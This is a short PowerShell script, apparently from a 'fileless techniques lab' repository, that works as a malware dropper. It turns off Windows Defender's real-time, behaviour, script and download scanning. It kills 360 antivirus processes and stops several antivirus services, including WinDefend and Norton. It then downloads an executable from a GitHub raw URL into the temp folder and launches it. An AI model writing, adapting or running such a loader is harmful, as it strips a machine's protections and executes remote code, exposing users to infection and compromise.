$ProgressPreference = 'SilentlyContinue'

$repoUrl = "https://raw.githubusercontent.com/sbkkkk/fileless-techniques-lab/main/software2.exe"
$destPath = "$env:TEMP\software2.exe"

try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
} catch {

}

try {
    taskkill /F /IM 360tray.exe 2>$null
    taskkill /F /IM 360sd.exe 2>$null
    Stop-Service -Name "360rp" -Force -ErrorAction SilentlyContinue
    Stop-Service -Name "360sd" -Force -ErrorAction SilentlyContinue
} catch {

}

$services = @(
    "avast! Antivirus",
    "Norton Security",
    "WinDefend",
    "MsMpSvc",
    "SecurityHealthService"
)

foreach ($service in $services) {
    try {
        Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
    } catch {

    }
}

try {
    Invoke-WebRequest -Uri $repoUrl -OutFile $destPath -ErrorAction Stop
    if (Test-Path $destPath) {
        Start-Process $destPath
    }
} catch {
    exit
}
